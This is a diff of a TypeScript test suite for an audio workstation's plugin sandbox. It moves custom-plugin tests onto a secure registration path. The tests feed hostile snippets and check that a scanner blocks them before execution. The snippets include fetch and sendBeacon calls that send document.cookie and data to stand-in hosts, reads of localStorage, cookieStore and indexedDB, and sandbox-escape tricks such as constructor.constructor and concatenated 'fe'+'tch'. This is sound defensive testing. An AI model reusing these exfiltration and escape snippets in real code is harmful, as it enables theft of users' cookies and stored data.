@@ -10,12 +10,8 @@ import {
   SATURATOR_DRIVE_DEBOUNCE_MS,
 } from './builtinPlugins';
 import { pluginHost, clampToDef } from './PluginHost';
-import {
-  evaluateCustomPlugin,
-  evaluateCustomPluginSandboxed,
-  isSandboxAvailable,
-  scanCustomPluginCode,
-} from './pluginSandbox';
+import { isSandboxAvailable, scanCustomPluginCode, ensureSandboxBackend } from './pluginSandbox';
+import { registerCustomPluginForTest } from './pluginTestBridge';
 import type { ActiveDSPNode } from './PluginHost';
 import { AudioEngine } from './AudioEngine';
 import { MasterBus } from './MasterBus';
@@ -383,6 +379,11 @@ describe('waveA: seguridad de plugins y operaciones', () => {
 
 // ---------------------------------------------------------------------------
 // SEC-01 / AUD-08: el sandbox de plugins rechaza la exfiltración (SB1-SB7)
+// Ronda fix 1: el código de usuario SOLO se evalúa en el iframe opaco. Estos
+// tests verifican la puerta de entrada real (`registerCustomPluginSecure`):
+// en node no hay contenedor, así que todo payload hostil debe caer en el
+// escáner ANTES de cualquier ejecución. Los stubs (fetch, sonda) delatan
+// cualquier ejecución.
 // ---------------------------------------------------------------------------
 
 const SB_LEGIT_CODE = `
@@ -399,67 +400,62 @@ const SB_LEGIT_CODE = `
   };
 `;
 
+/** La vía real rechaza sin ejecutar (en node, el escáner dispara primero). */
+async function expectSecurelyBlocked(code: string): Promise<void> {
+  await expect(pluginHost.registerCustomPluginSecure(code)).rejects.toThrow(
+    /bloqueado por seguridad/
+  );
+}
+
 describe('SEC-01: el sandbox de plugins rechaza la exfiltración (SB1-SB7)', () => {
-  it('SB1: globalThis.fetch se rechaza y no deja rastro en globalThis', () => {
-    expect(() =>
-      pluginHost.registerCustomPlugin(`
+  it('SB1: globalThis.fetch se rechaza y no deja rastro en globalThis', async () => {
+    await expectSecurelyBlocked(`
         globalThis.fetch('https://malicioso.example/fuga');
         const customPlugin = { id: 'sb1', name: 'SB1', parameters: [], createDSPNode: () => ({}) };
-      `)
-    ).toThrow(/bloqueado por seguridad/);
-    expect(() =>
-      pluginHost.registerCustomPlugin(`
+      `);
+    await expectSecurelyBlocked(`
         globalThis.__pwned = 1;
         const customPlugin = { id: 'sb1b', name: 'SB1b', parameters: [], createDSPNode: () => ({}) };
-      `)
-    ).toThrow(/bloqueado por seguridad/);
+      `);
     expect((globalThis as unknown as Record<string, unknown>).__pwned).toBeUndefined();
   });
 
-  it('SB2: navigator.sendBeacon se rechaza', () => {
-    expect(() =>
-      pluginHost.registerCustomPlugin(`
+  it('SB2: navigator.sendBeacon se rechaza', async () => {
+    await expectSecurelyBlocked(`
         navigator.sendBeacon('https://malicioso.example/fuga', 'datos');
         const customPlugin = { id: 'sb2', name: 'SB2', parameters: [], createDSPNode: () => ({}) };
-      `)
-    ).toThrow(/bloqueado por seguridad/);
+      `);
   });
 
-  it('SB3: location.href se rechaza', () => {
-    expect(() =>
-      pluginHost.registerCustomPlugin(`
+  it('SB3: location.href se rechaza', async () => {
+    await expectSecurelyBlocked(`
         const destino = location.href;
         const customPlugin = { id: 'sb3', name: 'SB3', parameters: [], createDSPNode: () => ({}) };
-      `)
-    ).toThrow(/bloqueado por seguridad/);
+      `);
   });
 
-  it('SB4: x.constructor.constructor("...") se rechaza', () => {
-    expect(() =>
-      pluginHost.registerCustomPlugin(`
+  it('SB4: x.constructor.constructor("...") se rechaza', async () => {
+    await expectSecurelyBlocked(`
         const x = {};
         const f = x.constructor.constructor("return 42");
         const customPlugin = { id: 'sb4', name: 'SB4', parameters: [], createDSPNode: () => ({}) };
-      `)
-    ).toThrow(/bloqueado por seguridad/);
+      `);
   });
 
-  it('SB5: self["fe"+"tch"] (concatenación) se rechaza', () => {
-    expect(() =>
-      pluginHost.registerCustomPlugin(`
+  it('SB5: self["fe"+"tch"] (concatenación) se rechaza', async () => {
+    await expectSecurelyBlocked(`
         const robar = self['fe' + 'tch'];
         const customPlugin = { id: 'sb5', name: 'SB5', parameters: [], createDSPNode: () => ({}) };
-      `)
-    ).toThrow(/bloqueado por seguridad/);
+      `);
   });
 
-  it('SB6: un plugin legítimo sí se acepta', () => {
-    const def = pluginHost.registerCustomPlugin(SB_LEGIT_CODE);
+  it('SB6: un plugin legítimo sí se acepta (puente de test)', async () => {
+    const def = await registerCustomPluginForTest(SB_LEGIT_CODE);
     expect(def.id).toBe('sb_legit');
     expect(typeof def.createDSPNode).toBe('function');
   });
 
-  it('SB7: el código no puede leer el almacenamiento del padre (caches/cookieStore/localStorage/indexedDB)', () => {
+  it('SB7: el código no puede leer el almacenamiento del padre (caches/cookieStore/localStorage/indexedDB)', async () => {
     const seen: string[] = [];
     vi.stubGlobal('caches', {
       open: (name: string) => {
@@ -486,39 +482,30 @@ describe('SEC-01: el sandbox de plugins rechaza la exfiltración (SB1-SB7)', () 
       },
     });
     try {
-      expect(() =>
-        pluginHost.registerCustomPlugin(`
+      await expectSecurelyBlocked(`
           caches.open('hydradaw-proyectos');
           const customPlugin = { id: 'sb7a', name: 'SB7a', parameters: [], createDSPNode: () => ({}) };
-        `)
-      ).toThrow(/bloqueado por seguridad/);
-      expect(() =>
-        pluginHost.registerCustomPlugin(`
+        `);
+      await expectSecurelyBlocked(`
           cookieStore.get('sesion');
           const customPlugin = { id: 'sb7b', name: 'SB7b', parameters: [], createDSPNode: () => ({}) };
-        `)
-      ).toThrow(/bloqueado por seguridad/);
-      expect(() =>
-        pluginHost.registerCustomPlugin(`
+        `);
+      await expectSecurelyBlocked(`
           const robado = localStorage.getItem('proyecto');
           const customPlugin = { id: 'sb7c', name: 'SB7c', parameters: [], createDSPNode: () => ({}) };
-        `)
-      ).toThrow(/bloqueado por seguridad/);
-      expect(() =>
-        pluginHost.registerCustomPlugin(`
+        `);
+      await expectSecurelyBlocked(`
           const db = indexedDB.open('hydradaw');
           const customPlugin = { id: 'sb7d', name: 'SB7d', parameters: [], createDSPNode: () => ({}) };
-        `)
-      ).toThrow(/bloqueado por seguridad/);
+        `);
       expect(seen).toEqual([]);
     } finally {
       vi.unstubAllGlobals();
     }
   });
 
-  it('SB7b: el acceso diferido dentro de createDSPNode también se rechaza en el registro', () => {
-    expect(() =>
-      pluginHost.registerCustomPlugin(`
+  it('SB7b: el acceso diferido dentro de createDSPNode también se rechaza en el registro', async () => {
+    await expectSecurelyBlocked(`
         const customPlugin = {
           id: 'sb7_deferred',
           name: 'Diferido',
@@ -531,33 +518,31 @@ describe('SEC-01: el sandbox de plugins rechaza la exfiltración (SB1-SB7)', () 
             return { inputNode: g, outputNode: g, updateParameter: () => {} };
           }
         };
-      `)
-    ).toThrow(/bloqueado por seguridad/);
+      `);
   });
 
-  it('SB-Proto: evaluateCustomPlugin devuelve el protocolo {ok} y rechaza lo prohibido', () => {
-    const good = evaluateCustomPlugin(SB_LEGIT_CODE);
-    expect(good.ok).toBe(true);
-    if (good.ok) expect(good.definition.id).toBe('sb_legit');
-    const bad = evaluateCustomPlugin(
-      `globalThis.fetch('https://malicioso.example/x');\nconst customPlugin = { id: 'z', createDSPNode: () => ({}) };`
-    );
-    expect(bad.ok).toBe(false);
-    if (!bad.ok) expect(bad.error).toMatch(/bloqueado por seguridad/);
-    expect(evaluateCustomPlugin('   ').ok).toBe(false);
+  it('SB-Proto: el escáner acepta lo legítimo y rechaza lo hostil', () => {
+    expect(scanCustomPluginCode(SB_LEGIT_CODE)).toBeNull();
+    expect(
+      scanCustomPluginCode(
+        `globalThis.fetch('https://malicioso.example/x');\nconst customPlugin = { id: 'z', createDSPNode: () => ({}) };`
+      )
+    ).toMatch(/bloqueado|globalThis|restringido/);
   });
 
   it('SB-Proto: sin DOM no hay sandbox y la vía aislada rechaza sin ejecutar nada', async () => {
     expect(isSandboxAvailable()).toBe(false);
+    expect(() => ensureSandboxBackend()).toThrow(/sandbox/i);
     const seen: string[] = [];
     vi.stubGlobal('fetch', () => {
       seen.push('fetch');
       return Promise.resolve(null);
     });
     try {
-      const res = await evaluateCustomPluginSandboxed(SB_LEGIT_CODE);
-      expect(res.ok).toBe(false);
-      if (!res.ok) expect(res.error).toMatch(/sandbox/i);
+      // Hasta el código legítimo se rechaza sin sandbox: nunca sin protección.
+      await expect(pluginHost.registerCustomPluginSecure(SB_LEGIT_CODE)).rejects.toThrow(
+        /sandbox/i
+      );
       expect(seen).toEqual([]);
     } finally {
       vi.unstubAllGlobals();
@@ -596,36 +581,32 @@ describe('SEC-01r: el escáner rechaza alias y accesos dinámicos (ronda fix 1)'
     return (globalThis as unknown as { __sbxProbe: { touched: string[] } }).__sbxProbe.touched;
   }
 
-  it('SB-X1: `const e = eval; e(payload)` se rechaza por la palabra eval', () => {
+  it('SB-X1: `const e = eval; e(payload)` se rechaza por la palabra eval', async () => {
     expect(scanCustomPluginCode(`const e = eval;\n${SB_VALID_TAIL}`)).toMatch(/eval/);
-    expect(() =>
-      pluginHost.registerCustomPlugin(`const e = eval;\ne("__sbxProbe.touched.push('X1')");\n${SB_VALID_TAIL}`)
-    ).toThrow(/bloqueado por seguridad/);
+    await expectSecurelyBlocked(
+      `const e = eval;\ne("__sbxProbe.touched.push('X1')");\n${SB_VALID_TAIL}`
+    );
     expect(probeTouched()).toEqual([]);
   });
 
-  it('SB-X2: `const f = Function; f("...")()` se rechaza por la palabra Function', () => {
+  it('SB-X2: `const f = Function; f("...")()` se rechaza por la palabra Function', async () => {
     expect(scanCustomPluginCode(`const f = Function;\n${SB_VALID_TAIL}`)).toMatch(/Function/);
-    expect(() =>
-      pluginHost.registerCustomPlugin(
-        `const f = Function;\nf("__sbxProbe.touched.push('X2'); return 1")();\n${SB_VALID_TAIL}`
-      )
-    ).toThrow(/bloqueado por seguridad/);
+    await expectSecurelyBlocked(
+      `const f = Function;\nf("__sbxProbe.touched.push('X2'); return 1")();\n${SB_VALID_TAIL}`
+    );
     expect(probeTouched()).toEqual([]);
   });
 
-  it("SB-X3: `globalThis['fet'+'ch']` se rechaza y fetch no se llama", () => {
+  it("SB-X3: `globalThis['fet'+'ch']` se rechaza y fetch no se llama", async () => {
     const calls: string[] = [];
     vi.stubGlobal('fetch', (...args: unknown[]) => {
       calls.push(String(args[0]));
       return Promise.resolve(null);
     });
     try {
-      expect(() =>
-        pluginHost.registerCustomPlugin(
-          `globalThis['fet' + 'ch']('https://malicioso.example/fuga');\n${SB_VALID_TAIL}`
-        )
-      ).toThrow(/bloqueado por seguridad/);
+      await expectSecurelyBlocked(
+        `globalThis['fet' + 'ch']('https://malicioso.example/fuga');\n${SB_VALID_TAIL}`
+      );
       expect(calls).toEqual([]);
       expect(probeTouched()).toEqual([]);
     } finally {
@@ -634,7 +615,7 @@ describe('SEC-01r: el escáner rechaza alias y accesos dinámicos (ronda fix 1)'
     }
   });
 
-  it("SB-X4: `navigator['sendBeac'+'on']` se rechaza y no se llama", () => {
+  it("SB-X4: `navigator['sendBeac'+'on']` se rechaza y no se llama", async () => {
     const calls: unknown[][] = [];
     vi.stubGlobal('navigator', {
       sendBeacon: (...args: unknown[]) => {
@@ -643,11 +624,9 @@ describe('SEC-01r: el escáner rechaza alias y accesos dinámicos (ronda fix 1)'
       },
     });
     try {
-      expect(() =>
-        pluginHost.registerCustomPlugin(
-          `navigator['sendBeac' + 'on']('https://malicioso.example/fuga', 'd');\n${SB_VALID_TAIL}`
-        )
-      ).toThrow(/bloqueado por seguridad/);
+      await expectSecurelyBlocked(
+        `navigator['sendBeac' + 'on']('https://malicioso.example/fuga', 'd');\n${SB_VALID_TAIL}`
+      );
       expect(calls).toEqual([]);
       expect(probeTouched()).toEqual([]);
     } finally {
@@ -656,54 +635,44 @@ describe('SEC-01r: el escáner rechaza alias y accesos dinámicos (ronda fix 1)'
     }
   });
 
-  it("SB-X5: `location['href']` se rechaza", () => {
+  it("SB-X5: `location['href']` se rechaza", async () => {
     expect(scanCustomPluginCode(`const u = location['href'];\n${SB_VALID_TAIL}`)).toMatch(/location/);
-    expect(() =>
-      pluginHost.registerCustomPlugin(`const u = location['href'];\n${SB_VALID_TAIL}`)
-    ).toThrow(/bloqueado por seguridad/);
+    await expectSecurelyBlocked(`const u = location['href'];\n${SB_VALID_TAIL}`);
     expect(probeTouched()).toEqual([]);
   });
 
-  it("SB-X6: `this['constr'+'uctor']` se rechaza por la palabra this", () => {
+  it("SB-X6: `this['constr'+'uctor']` se rechaza por la palabra this", async () => {
     expect(scanCustomPluginCode(`const c = this['constr' + 'uctor'];\n${SB_VALID_TAIL}`)).toMatch(
       /this/
     );
-    expect(() =>
-      pluginHost.registerCustomPlugin(
-        `const c = this['constr' + 'uctor'];\n__sbxProbe.touched.push('X6');\n${SB_VALID_TAIL}`
-      )
-    ).toThrow(/bloqueado por seguridad/);
+    await expectSecurelyBlocked(
+      `const c = this['constr' + 'uctor'];\n__sbxProbe.touched.push('X6');\n${SB_VALID_TAIL}`
+    );
     expect(probeTouched()).toEqual([]);
   });
 
-  it('SB-X7: alcanzar `window.parent` se rechaza y no deja rastro', () => {
-    expect(() =>
-      pluginHost.registerCustomPlugin(
-        `const p = window.parent;\n__sbxProbe.touched.push('X7');\n${SB_VALID_TAIL}`
-      )
-    ).toThrow(/bloqueado por seguridad/);
+  it('SB-X7: alcanzar `window.parent` se rechaza y no deja rastro', async () => {
+    await expectSecurelyBlocked(
+      `const p = window.parent;\n__sbxProbe.touched.push('X7');\n${SB_VALID_TAIL}`
+    );
     expect(probeTouched()).toEqual([]);
   });
 });
 
-  it('registerCustomPlugin bloquea scripts con acceso a APIs peligrosas (fetch/DOM/Storage)', () => {
-    expect(() => {
-      pluginHost.registerCustomPlugin(`
+  it('la vía segura bloquea scripts con acceso a APIs peligrosas (fetch/DOM/Storage)', async () => {
+    await expectSecurelyBlocked(`
         fetch('https://malicious.site/leak?c=' + document.cookie);
         const customPlugin = { id: 'bad', name: 'Bad', createDSPNode: () => {} };
       `);
-    }).toThrow(/bloqueado por seguridad/);
 
-    expect(() => {
-      pluginHost.registerCustomPlugin(`
+    await expectSecurelyBlocked(`
         window.localStorage.setItem('compromised', 'true');
         const customPlugin = { id: 'bad2', name: 'Bad 2', createDSPNode: () => {} };
       `);
-    }).toThrow(/bloqueado por seguridad/);
   });
 
-  it('registerCustomPlugin admite plugins válidos y seguros', () => {
-    const valid = pluginHost.registerCustomPlugin(`
+  it('la vía puente admite plugins válidos y seguros', async () => {
+    const valid = await registerCustomPluginForTest(`
       const customPlugin = {
         id: 'clean_gain',
         name: 'Clean Gain',
@@ -870,16 +839,16 @@ function setupT10Engine() {
 
 describe('AUD-10: un plugin roto no rompe el transporte', () => {
   it('createInstanceNode degrada a pass-through si el nodo no tiene forma válida', () => {
-    pluginHost.registerCustomPlugin(`
-      const customPlugin = {
-        id: 'aud10_shape',
-        name: 'Forma Rota',
-        category: 'utility',
-        description: 'devuelve un objeto sin nodos',
-        parameters: [],
-        createDSPNode: () => ({})
-      };
-    `);
+    // Ronda fix 1: definición de primera parte (objeto vivo, no código de
+    // usuario) para probar la degradación del transporte.
+    pluginHost.registerPluginDefinition({
+      id: 'aud10_shape',
+      name: 'Forma Rota',
+      category: 'utility',
+      description: 'devuelve un objeto sin nodos',
+      parameters: [],
+      createDSPNode: () => ({}),
+    });
     // Fix(M2/I3): el mock arranca en 0 para que solo un pass-through con
     // ganancia unidad explícita pase la aserción (el código pre-fix no la fijaba).
     const simpleCtx = { createGain: () => ({ connect(): void {}, disconnect(): void {}, gain: { value: 0 } }) };
@@ -899,16 +868,16 @@ describe('AUD-10: un plugin roto no rompe el transporte', () => {
   });
 
   it('createInstanceNode degrada a pass-through si createDSPNode lanza', () => {
-    pluginHost.registerCustomPlugin(`
-      const customPlugin = {
-        id: 'aud10_throw',
-        name: 'Lanza Siempre',
-        category: 'utility',
-        description: 'lanza al instanciar',
-        parameters: [],
-        createDSPNode: () => { throw new Error('boom aud10'); }
-      };
-    `);
+    pluginHost.registerPluginDefinition({
+      id: 'aud10_throw',
+      name: 'Lanza Siempre',
+      category: 'utility',
+      description: 'lanza al instanciar',
+      parameters: [],
+      createDSPNode: () => {
+        throw new Error('boom aud10');
+      },
+    });
     const simpleCtx = { createGain: () => ({ connect(): void {}, disconnect(): void {}, gain: { value: 0 } }) };
     const node = pluginHost.createInstanceNode(simpleCtx as unknown as BaseAudioContext, {
       instanceId: 'i_throw',
@@ -927,16 +896,14 @@ describe('AUD-10: un plugin roto no rompe el transporte', () => {
   });
 
   it('createInstanceNode degrada a pass-through si outputNode no es cableable (M1)', () => {
-    pluginHost.registerCustomPlugin(`
-      const customPlugin = {
-        id: 'aud10_half',
-        name: 'Medio Formado',
-        category: 'utility',
-        description: 'input válido pero output sin connect',
-        parameters: [],
-        createDSPNode: (ctx) => ({ inputNode: ctx.createGain(), outputNode: {} })
-      };
-    `);
+    pluginHost.registerPluginDefinition({
+      id: 'aud10_half',
+      name: 'Medio Formado',
+      category: 'utility',
+      description: 'input válido pero output sin connect',
+      parameters: [],
+      createDSPNode: (ctx) => ({ inputNode: ctx.createGain(), outputNode: {} }),
+    });
     const simpleCtx = { createGain: () => ({ connect(): void {}, disconnect(): void {}, gain: { value: 0 } }) };
     const node = pluginHost.createInstanceNode(simpleCtx as unknown as BaseAudioContext, {
       instanceId: 'i_half',
@@ -970,20 +937,18 @@ describe('AUD-10: un plugin roto no rompe el transporte', () => {
   });
 
   it('un fallo al cablear degrada a pass-through sin propagar', async () => {
-    pluginHost.registerCustomPlugin(`
-      const customPlugin = {
-        id: 'aud10_wire',
-        name: 'Cable Roto',
-        category: 'utility',
-        description: 'nodo ajeno que rompe connect',
-        parameters: [],
-        createDSPNode: (ctx) => {
-          const g = ctx.createGain();
-          const foreign = { connect: () => {}, __boomPlug: true };
-          return { inputNode: foreign, outputNode: g, updateParameter: () => {} };
-        }
-      };
-    `);
+    pluginHost.registerPluginDefinition({
+      id: 'aud10_wire',
+      name: 'Cable Roto',
+      category: 'utility',
+      description: 'nodo ajeno que rompe connect',
+      parameters: [],
+      createDSPNode: (ctx) => {
+        const g = ctx.createGain();
+        const foreign = { connect: () => {}, __boomPlug: true };
+        return { inputNode: foreign, outputNode: g, updateParameter: () => {} };
+      },
+    });
     const { engine, mockCtx } = setupT10Engine();
     const badTrack = makeT10Track('wbad', {
       plugins: [
@@ -998,20 +963,18 @@ describe('AUD-10: un plugin roto no rompe el transporte', () => {
   });
 
   it('el pass-through de un cableado roto queda registrado y se limpia en dispose (I2)', () => {
-    pluginHost.registerCustomPlugin(`
-      const customPlugin = {
-        id: 'aud10_wire2',
-        name: 'Cable Roto 2',
-        category: 'utility',
-        description: 'nodo ajeno que rompe connect',
-        parameters: [],
-        createDSPNode: (ctx) => {
-          const g = ctx.createGain();
-          const foreign = { connect: () => {}, __boomPlug: true };
-          return { inputNode: foreign, outputNode: g, updateParameter: () => {} };
-        }
-      };
-    `);
+    pluginHost.registerPluginDefinition({
+      id: 'aud10_wire2',
+      name: 'Cable Roto 2',
+      category: 'utility',
+      description: 'nodo ajeno que rompe connect',
+      parameters: [],
+      createDSPNode: (ctx) => {
+        const g = ctx.createGain();
+        const foreign = { connect: () => {}, __boomPlug: true };
+        return { inputNode: foreign, outputNode: g, updateParameter: () => {} };
+      },
+    });
     const mockCtx = new T10BaseContext();
     const track = makeT10Track('regtest', {
       plugins: [
@@ -1029,20 +992,18 @@ describe('AUD-10: un plugin roto no rompe el transporte', () => {
   });
 
   it('el cableado roto avisa con el pluginId antes de degradar (I2)', () => {
-    pluginHost.registerCustomPlugin(`
-      const customPlugin = {
-        id: 'aud10_wire3',
-        name: 'Cable Roto 3',
-        category: 'utility',
-        description: 'nodo ajeno que rompe connect',
-        parameters: [],
-        createDSPNode: (ctx) => {
-          const g = ctx.createGain();
-          const foreign = { connect: () => {}, __boomPlug: true };
-          return { inputNode: foreign, outputNode: g, updateParameter: () => {} };
-        }
-      };
-    `);
+    pluginHost.registerPluginDefinition({
+      id: 'aud10_wire3',
+      name: 'Cable Roto 3',
+      category: 'utility',
+      description: 'nodo ajeno que rompe connect',
+      parameters: [],
+      createDSPNode: (ctx) => {
+        const g = ctx.createGain();
+        const foreign = { connect: () => {}, __boomPlug: true };
+        return { inputNode: foreign, outputNode: g, updateParameter: () => {} };
+      },
+    });
     const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
     try {
       const mockCtx = new T10BaseContext();
@@ -1061,40 +1022,41 @@ describe('AUD-10: un plugin roto no rompe el transporte', () => {
   });
 
   it('si falla la salida final, los plugins sanos se conservan (M3)', () => {
-    pluginHost.registerCustomPlugin(`
-      const customPlugin = {
-        id: 'aud10_good2',
-        name: 'Sano',
-        category: 'utility',
-        description: 'pass-through sano',
-        parameters: [],
-        createDSPNode: (ctx) => {
-          const g = ctx.createGain();
-          return { inputNode: g, outputNode: g, updateParameter: () => {} };
-        }
-      };
-    `);
-    pluginHost.registerCustomPlugin(`
-      const customPlugin = {
-        id: 'aud10_panner_break',
-        name: 'Rompe Panner',
-        category: 'utility',
-        description: 'salida que rompe solo hacia el panner',
-        parameters: [],
-        createDSPNode: (ctx) => {
-          const g = ctx.createGain();
-          const out = {
-            calls: [],
-            connect: (dest) => {
-              if (dest && dest.__isPanner) throw new Error('panner roto');
-              out.calls.push(dest);
-            },
-            disconnect: () => {},
-          };
-          return { inputNode: g, outputNode: out, updateParameter: () => {} };
-        }
-      };
-    `);
+    pluginHost.registerPluginDefinition({
+      id: 'aud10_good2',
+      name: 'Sano',
+      category: 'utility',
+      description: 'pass-through sano',
+      parameters: [],
+      createDSPNode: (ctx) => {
+        const g = ctx.createGain();
+        return { inputNode: g, outputNode: g, updateParameter: () => {} };
+      },
+    });
+    interface M3BreakerOut {
+      calls: unknown[];
+      connect: (dest?: { __isPanner?: boolean }) => void;
+      disconnect: () => void;
+    }
+    pluginHost.registerPluginDefinition({
+      id: 'aud10_panner_break',
+      name: 'Rompe Panner',
+      category: 'utility',
+      description: 'salida que rompe solo hacia el panner',
+      parameters: [],
+      createDSPNode: (ctx) => {
+        const g = ctx.createGain();
+        const out: M3BreakerOut = {
+          calls: [],
+          connect: (dest) => {
+            if (dest && dest.__isPanner) throw new Error('panner roto');
+            out.calls.push(dest);
+          },
+          disconnect: () => {},
+        };
+        return { inputNode: g, outputNode: out, updateParameter: () => {} };
+      },
+    });
     const mockCtx = new T10BaseContext();
     const track = makeT10Track('m3test', {
       plugins: [
